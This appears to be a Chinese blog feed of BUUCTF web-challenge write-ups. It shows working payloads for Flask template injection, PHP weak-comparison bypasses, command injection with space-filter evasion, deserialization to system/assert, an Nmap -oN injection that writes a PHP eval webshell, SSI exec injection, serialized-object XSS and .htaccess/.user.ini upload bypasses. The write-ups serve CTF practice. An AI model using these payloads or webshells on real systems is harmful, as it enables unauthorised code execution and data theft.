        s = s.replace(<span class="hljs-string">'('</span>, <span class="hljs-string">''</span>).replace(<span class="hljs-string">')'</span>, <span class="hljs-string">''</span>)
        blacklist = [<span class="hljs-string">'config'</span>, <span class="hljs-string">'self'</span>]
        <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join([<span class="hljs-string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="hljs-keyword">for</span> c in blacklist]) + s

    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    app.run(debug=<span class="hljs-keyword">True</span>)</code></pre></div>

<p>可以看到给了两个路由，一个是显示主页内容，一个响应用户请求信息。</p>
<p>可以看到  <code>jinja</code>,这些都是在模板引擎中有的东西，猜测是SSTi</p>
<p>访问</p>
<div class="hljs"><pre><code class="hljs angelscript">/shrine/&#123;&#123;<span class="hljs-number">2</span>*<span class="hljs-number">4</span>&#125;&#125;</code></pre></div>

<p><img src="https://i.loli.net/2020/12/21/C1QdNuAvLGPyhkp.png" srcset="/img/loading.gif" alt="image-20201221081722030"></p>
<p>页面显示了 2 * 4 的结果，说明就是模板引擎注入。</p>
<p>继续看源码，首先<code>app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)</code>注册了名为FLAG的config，这个应该就是flag</p>
<p>但是在 safe_jinja中将config和self加入了黑名单，并且过滤了 ( )，导致我们无法直接使用<code>{{config}}</code>查看</p>
<p>不过python还有一些内置函数，比如url_for和get_flashed_messages</p>
<div class="hljs"><pre><code class="hljs awk"><span class="hljs-regexp">/shrine/</span>&#123;&#123;url_for.__globals__&#125;&#125;</code></pre></div>

<p><img src="https://i.loli.net/2020/12/21/MJamurQob4zp5BF.png" srcset="/img/loading.gif" alt="image-20201221082932640"></p>
<p>current_app意思应该是当前app，那我们就当前app下的config</p>
<div class="hljs"><pre><code class="hljs awk"><span class="hljs-regexp">/shrine/</span>&#123;&#123;url_for.__globals__[<span class="hljs-string">'current_app'</span>].config&#125;&#125;</code></pre></div>

<p><img src="https://i.loli.net/2020/12/21/3Z1HNfE9MsXvFAw.png" srcset="/img/loading.gif" alt="image-20201221083018592"></p>
<p>参考链接：</p>
<blockquote>
<p><a href="https://www.cnblogs.com/wangtanzhi/p/12238779.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12238779.html</a></p>
</blockquote>
<h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>扫描目录看到robots.txt，进去看到了  /fAke_f1agggg.php，访问并在响应头中</p>
<p><img src="https://i.loli.net/2020/12/22/FB4CfAkSPH6xwXe.png" srcset="/img/loading.gif" alt="image-20201222223155058"></p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-comment">//level 1</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'num'</span>]))&#123;
    $num = $_GET[<span class="hljs-string">'num'</span>];
    <span class="hljs-keyword">if</span>(intval($num) &lt; <span class="hljs-number">2020</span> &amp;&amp; intval($num + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"</span>;
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"金钱解决不了穷人的本质问题"</span>);
    &#125;
&#125;<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"去非洲吧"</span>);
&#125;

<span class="hljs-comment">//level 2</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'md5'</span>]))&#123;
   $md5=$_GET[<span class="hljs-string">'md5'</span>];
   <span class="hljs-keyword">if</span> ($md5==md5($md5))
       <span class="hljs-keyword">echo</span> <span class="hljs-string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;"</span>;
   <span class="hljs-keyword">else</span>
       <span class="hljs-keyword">die</span>(<span class="hljs-string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span>);
&#125;<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"去非洲吧"</span>);
&#125;
<span class="hljs-comment">//get flag</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'get_flag'</span>]))&#123;
    $get_flag = $_GET[<span class="hljs-string">'get_flag'</span>];
    <span class="hljs-keyword">if</span>(!strstr($get_flag,<span class="hljs-string">" "</span>))&#123;
        $get_flag = str_ireplace(<span class="hljs-string">"cat"</span>, <span class="hljs-string">"wctf2020"</span>, $get_flag);
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;"</span>;
        system($get_flag);
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"快到非洲了"</span>);
    &#125;
&#125;<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"去非洲吧"</span>);
&#125;</code></pre></div>

<p>第一关利用intval处理十六进制字符串的漏洞，当intval(‘0x1’) =0，而intval(‘0x1’+1) = 2</p>
<p>所以构造payload:</p>
<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">num</span> = <span class="hljs-number">0</span>x2222</code></pre></div>

<p>第二关使得 $md5==md5($md5)成立，因为使用的是弱比较，所以容易找到这样的字符串，python脚本如下</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span><span class="hljs-params">(str)</span>:</span>
    m = hashlib.md5()
    m.update(str.encode(<span class="hljs-string">"utf8"</span>))
    <span class="hljs-comment">#print(m.hexdigest())</span>
    <span class="hljs-keyword">return</span> m.hexdigest()

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">999999999</span>):
    md = <span class="hljs-string">'0e'</span>
    md = md + str(i)
    md1 = md5(md)
    md1 = str(md1)
    print(i)
    <span class="hljs-keyword">if</span> md1[:<span class="hljs-number">2</span>] == <span class="hljs-string">'0e'</span> <span class="hljs-keyword">and</span> md1[<span class="hljs-number">2</span>:].isdigit():
        print(md)
        <span class="hljs-keyword">break</span></code></pre></div>

<p>最后找到的字符串是 <code>0e215962017</code>，跑的时间有点长，耐心等待</p>
<p>第三关，过滤了空格，cat</p>
<p>可以用<code>$IFS$9</code>和<code>more</code>或者<code>less</code>替换</p>
<p>先用<code>ls</code>命令查看目录</p>
<div class="hljs"><pre><code class="hljs angelscript">num=<span class="hljs-number">0x1234</span>&amp;md5=<span class="hljs-number">0e215962017</span>&amp;get_flag=ls</code></pre></div>

<p><img src="https://i.loli.net/2020/12/22/fihPlyegv8AX1NJ.png" srcset="/img/loading.gif" alt="image-20201222232610053"></p>
<p>读取flag，最后的payload</p>
<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">num</span>=<span class="hljs-number">0</span>x1234&amp;md5=<span class="hljs-number">0</span>e215962017&amp;get_flag=more<span class="hljs-variable">$IFS</span><span class="hljs-variable">$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span></code></pre></div>



<h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>查看源码可以看到一个time.php，直接给出了源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">#error_reporting(0);</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $a;
    <span class="hljs-keyword">public</span> $b;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;a = <span class="hljs-string">"Y-m-d h:i:s"</span>;
        <span class="hljs-keyword">$this</span>-&gt;b = <span class="hljs-string">"date"</span>;
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>&#123;
        $a = <span class="hljs-keyword">$this</span>-&gt;a;
        $b = <span class="hljs-keyword">$this</span>-&gt;b;
        <span class="hljs-keyword">echo</span> $b($a);
    &#125;
&#125;
$c = <span class="hljs-keyword">new</span> HelloPhp;

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'source'</span>]))
&#123;
    highlight_file(<span class="hljs-keyword">__FILE__</span>);
    <span class="hljs-keyword">die</span>(<span class="hljs-number">0</span>);
&#125;

@$ppp = unserialize($_GET[<span class="hljs-string">"data"</span>]);</code></pre></div>

<p>很明显是反序列化</p>
<p>看到</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>&#123;
    $a = <span class="hljs-keyword">$this</span>-&gt;a;
    $b = <span class="hljs-keyword">$this</span>-&gt;b;
    <span class="hljs-keyword">echo</span> $b($a);
&#125;</code></pre></div>

<p>重点是<code>echo $b($a)</code>,本地测试一下，发现这样是可以的</p>
<p><img src="https://i.loli.net/2020/12/23/yemNOunQHXx5L71.png" srcset="/img/loading.gif" alt="image-20201223095013236"></p>
<p>所以就序列化出一个这样的对象然后去读取文件即可</p>
<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:"HelloPhp"</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">2</span>:<span class="hljs-string">"ls"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">1</span>:<span class="hljs-string">"b"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"system"</span>;&#125;</code></pre></div>

<p>刚开始构造的payload是想着列出目录，但是发现根本列不出目录，所以flag，应该没有放在根目录，于是再尝试读取phpinfo</p>
<p>使用assert结合phpinfo()，原理如下</p>
<p><img src="https://i.loli.net/2020/12/23/T8VkhlZmDvyxfU2.png" srcset="/img/loading.gif" alt="image-20201223100638809"></p>
<p>最后的payload：</p>
<div class="hljs"><pre><code class="hljs groovy">?data=O:<span class="hljs-number">8</span>:<span class="hljs-string">"HelloPhp"</span>:<span class="hljs-number">2</span>:&#123;<span class="hljs-string">s:</span><span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>;<span class="hljs-string">s:</span><span class="hljs-number">9</span>:<span class="hljs-string">"phpinfo()"</span>;<span class="hljs-string">s:</span><span class="hljs-number">1</span>:<span class="hljs-string">"b"</span>;<span class="hljs-string">s:</span><span class="hljs-number">6</span>:<span class="hljs-string">"assert"</span>;&#125;</code></pre></div>

<p>在phpinfo中搜索flag即可</p>
<h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>进入主页可以看到一个输入IP输入框，尝试输入127.0.0.1</p>
<p>结果是显示了扫描结果</p>
<img src="https://i.loli.net/2020/12/23/8It7ZchkmRe9S3B.png" srcset="/img/loading.gif" alt="image-20201223103012938" style="zoom:50%;">

<p>猜测后台的php代码应该是类似这样</p>
<div class="hljs"><pre><code class="hljs gams"><span class="hljs-keyword">system</span>(<span class="hljs-string">"nmap -sP"</span>.<span class="hljs-symbol">$</span>host);</code></pre></div>

<p>而这里使用 了system函数，所以会存在命令执行，在namp参数中 -oN 可以将扫描结果存放到指定的文件中，所以可以利用这个参数写入一句话木马</p>
<p><img src="https://i.loli.net/2020/12/23/9qepfWxhil36v7A.png" srcset="/img/loading.gif" alt="image-20201223103811846"></p>
<p>本地测试一下</p>
<p><img src="https://i.loli.net/2020/12/23/TMxZQOBmcePn7KD.png" srcset="/img/loading.gif" alt="image-20201223112043439"></p>
<p>可以看到上面的一句话木马已经写入到了1.php，那么久可以用这个方法做这题</p>
<p>使用下面的payload</p>
<p><img src="https://i.loli.net/2020/12/23/LgKxmFEzecqtCwN.png" srcset="/img/loading.gif" alt="image-20201223112236062"></p>
<p>但是回显了hacker，直接在输入框中输入php，也是回显haceker，所以应该是过滤了php，那就换一个一句话木马</p>
<div class="hljs"><pre><code class="hljs xml">' -oN b.phtml <span class="php"><span class="hljs-meta">&lt;?</span>=<span class="hljs-keyword">eval</span>($_POST[a]);<span class="hljs-meta">?&gt;</span></span>'</code></pre></div>

<p>访问 /b.phtml，发现是可以访问的，所以蚁剑链接，拿到flag</p>
<h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>扫描目录可以发现网页备份文件<code>index.php.swp</code></p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
	ob_start();
	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span><span class="hljs-params">()</span></span>&#123;
		$chars = <span class="hljs-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span>;
		$random = $chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].$chars[mt_rand(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span>
		$content = uniqid().$random;
		<span class="hljs-keyword">return</span> sha1($content); 
	&#125;
    header(<span class="hljs-string">"Content-Type: text/html;charset=utf-8"</span>);
	***
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'username'</span>]) <span class="hljs-keyword">and</span> $_POST[<span class="hljs-string">'username'</span>] != <span class="hljs-string">''</span> )
    &#123;
        $admin = <span class="hljs-string">'6d0bc1'</span>;
        <span class="hljs-keyword">if</span> ( $admin == substr(md5($_POST[<span class="hljs-string">'password'</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;"</span>;
            $file_shtml = <span class="hljs-string">"public/"</span>.get_hash().<span class="hljs-string">".shtml"</span>;
            $shtml = fopen($file_shtml, <span class="hljs-string">"w"</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Unable to open file!"</span>);
            $text = <span class="hljs-string">'</span>
<span class="hljs-string">            ***</span>
<span class="hljs-string">            ***</span>
<span class="hljs-string">            &lt;h1&gt;Hello,'</span>.$_POST[<span class="hljs-string">'username'</span>].<span class="hljs-string">'&lt;/h1&gt;</span>
<span class="hljs-string">            ***</span>
<span class="hljs-string">			***'</span>;
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			<span class="hljs-keyword">echo</span> <span class="hljs-string">"[!] Header  error ..."</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script&gt;alert('[!] Failed')&lt;/script&gt;"</span>;
            
    &#125;<span class="hljs-keyword">else</span>
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>代码审计</p>
<blockquote>
<p>1.第一个函数，是生成文件名，最后使用一个sha1函数，让文件名固定为32位</p>
<p>2.之后的第一个if语句的判断，username值不能位空</p>
<p>3.第二个password的md5值前六位等于 “6d0bc1”</p>
<p>4.之后的利用生成文件名的函数，生成一个文件(shtml)，并打开文件向其中写入$text</p>
<p>5.其中的username的值被带入$text中，所以这里存在注入</p>
</blockquote>
<p><strong>Apache SSI 远程命令执行漏洞</strong></p>
<p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用<code>&lt;!--#exec cmd=&quot;id&quot;--&gt;</code>语法执行命令。</p>
<p>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p>
<p><strong>1.绕过第一个if语句</strong></p>
<div class="hljs"><pre><code class="hljs perl">$admin == <span class="hljs-keyword">substr</span>(md5($_POST[<span class="hljs-string">'password'</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)</code></pre></div>

<p>利用脚本找到两个</p>
<div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">51302775</span>
<span class="hljs-number">2020666</span></code></pre></div>

<p><strong>2.在network中找到生成的文件</strong></p>
<p><img src="https://i.loli.net/2020/12/30/TxgJ4uZ6paf3s28.png" srcset="/img/loading.gif" alt="image-20201230090520608"></p>
<p><img src="https://i.loli.net/2020/12/30/pkPSdoEK5Dgi2hJ.png" srcset="/img/loading.gif" alt="image-20201230090618525"></p>
<p><strong>3.命令注入</strong></p>
<p>首先列出目录</p>
<div class="hljs"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--#exec cmd="ls ../"--&gt;</span></code></pre></div>

<p>可以看到<code>flag_990c66bf85a09c664f0b6741840499b2</code>，直接访问，即可拿到flag</p>
<h2 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a>[BJDCTF 2nd]xss之光</h2><p>扫描目录发现 /.git文件，git源码泄露，githack下载源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$a = $_GET[<span class="hljs-string">'yds_is_so_beautiful'</span>];
<span class="hljs-keyword">echo</span> unserialize($a);</code></pre></div>

<p>源码很简单，就是get提交一个参数后，进行反序列化，但是没有给出序列化过程，不知道类的结构</p>
<p><strong>php原生类利用</strong></p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$a = <span class="hljs-keyword">new</span> <span class="hljs-keyword">Exception</span>(<span class="hljs-string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>);
<span class="hljs-keyword">echo</span> urlencode(serialize($a));</code></pre></div>

<p>序列化后的内容为</p>
<div class="hljs"><pre><code class="hljs angelscript">O%<span class="hljs-number">3</span>A9%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Exception%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>message%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A25%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Cscript%<span class="hljs-number">3</span>Ealert%<span class="hljs-number">281</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>Fscript%<span class="hljs-number">3</span>E%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A17%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Exception%<span class="hljs-number">00</span>string%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>code%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00f</span>ile%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A18%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>Fusercode%<span class="hljs-number">2</span>Ffile.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>line%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A16%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Exception%<span class="hljs-number">00</span>trace%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A19%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Exception%<span class="hljs-number">00</span>previous%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D</code></pre></div>

<p>提交可以发现弹出了提示，说明构造成功了</p>
<p><img src="https://i.loli.net/2020/12/30/cjvt9y5SOMnENHG.png" srcset="/img/loading.gif" alt="image-20201230095717756"></p>
<p>但是并没有出现flag</p>
<p><strong>结合题目提示构造xss</strong></p>
<div class="hljs"><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
<span class="php">$a = <span class="hljs-keyword">new</span> <span class="hljs-keyword">Exception</span>(<span class="hljs-string">"&lt;script&gt;window.location.href='https://www.baidu.com'&lt;/script&gt;"</span>);</span>
<span class="php"><span class="hljs-keyword">echo</span> urlencode(serialize($a));</span></code></pre></div>

<p>payload:</p>
<div class="hljs"><pre><code class="hljs angelscript">O%<span class="hljs-number">3</span>A9%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Exception%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>message%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A61%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Cscript%<span class="hljs-number">3</span>Ewindow.location.href%<span class="hljs-number">3</span>D%<span class="hljs-number">27</span>https%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Fwww.baidu.com%<span class="hljs-number">27</span>%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>Fscript%<span class="hljs-number">3</span>E%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A17%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Exception%<span class="hljs-number">00</span>string%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>code%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00f</span>ile%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A43%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>D%<span class="hljs-number">3</span>A%<span class="hljs-number">5</span>CphpStudy%<span class="hljs-number">5</span>CPHPTutorial%<span class="hljs-number">5</span>CWWW%<span class="hljs-number">5</span>Ctest%<span class="hljs-number">5</span>Ccumt11.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>line%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A16%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Exception%<span class="hljs-number">00</span>trace%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A19%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Exception%<span class="hljs-number">00</span>previous%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D</code></pre></div>

<p>提交后就在响应头中出现flag</p>
<p><img src="https://i.loli.net/2020/12/30/dyxvkoh4HuJ7gQI.png" srcset="/img/loading.gif" alt="image-20201230100514805"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>md5</tag>
        <tag>ssrf</tag>
        <tag>system</tag>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf-upload</title>
    <url>/2020/10/08/buuoj-upload/</url>
    <content><![CDATA[<h1 id="buuctf-upload"><a href="#buuctf-upload" class="headerlink" title="buuctf-upload"></a>buuctf-upload</h1><a id="more"></a>



<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>先上传一个图片，发现上传成功了，还给出了文件的保存路径</p>
<p>再尝试上传<code>1.php</code>但是出现了，报错提示</p>
<p>首先尝试的是，将<code>Content-Type: image/jpeg</code>改为图片类型，但是还是无法上传</p>
<p>再尝试一下.htaccess文件</p>
<p>文件内容</p>
<div class="hljs"><pre><code class="hljs <FilesMatch">SetHandler application&#x2F;x-httpd-php
&lt;&#x2F;FilesMatch&gt;</code></pre></div>

<p><img src="https://i.loli.net/2020/11/30/Hi3YGuQoWCzg1P2.png" srcset="/img/loading.gif" alt></p>
<p>上传成功后，再上传包含一句话木马的 a.jpg文件，<code>.htaccess</code>文件的作用就是将指定类型的文件当作php文件运行</p>
<p>所以表面上是jpg类型的文件，但是是当作php文件</p>
<p><img src="https://i.loli.net/2020/11/30/83GHiZg5Ao7IbnF.png" srcset="/img/loading.gif" alt></p>
<p>上传成功后，蚁剑访问<code>url+/upload/3af588e32ac72180588d18d5c3b470b4/a.jpg</code></p>
<p>密码为：cmd</p>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>试着上传php文件，提示非法后缀名，继续修改后缀名，发现php3,php5,phtml等可执行文件后不可上传</p>
<p>想到上传<code>.htacess</code>文件，但是也提示了非法后缀名，这个方法行不通了</p>
<p>但是之前做upload-labs中还有一个上传<code>.user.ini</code>的文件</p>
<p><code>.user.ini</code>是什么</p>
<blockquote>
<p>这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。</p>
</blockquote>
<p><code>.user.ini</code>的作用</p>
<blockquote>
<p>可以借助.user.ini轻松让<strong>所有</strong>php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell</p>
</blockquote>
<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">传送门</a></p>
<p><strong>开始做题</strong></p>
<p>上传.user.ini文件</p>
